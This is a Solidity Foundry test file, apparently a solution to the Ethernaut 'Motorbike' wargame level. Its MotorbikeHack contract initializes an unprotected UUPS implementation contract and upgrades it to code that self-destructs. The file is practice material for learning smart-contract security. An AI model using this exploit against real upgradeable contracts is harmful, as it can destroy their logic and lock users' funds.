// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/Motorbike/Motorbike.sol";
import "./utils/EthernautTest.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract MotorbikeHack {
    IEngine public victim;

    constructor(address _targetAddress) {
        victim = IEngine(_targetAddress);
    }

    function exploit() external {
        victim.initialize();
        victim.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
    }

    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeTest is Test {
    Engine engine;

    function setUp() external {
        // Setup
        engine = new Engine();

        // Exploit
        vm.startPrank(tx.origin);
        MotorbikeHack motorbikeHack = new MotorbikeHack(address(engine));
        motorbikeHack.exploit();
        vm.stopPrank();
    }

    function test_motorbike() external {
        vm.expectRevert();
        engine.initialize();
    }
}
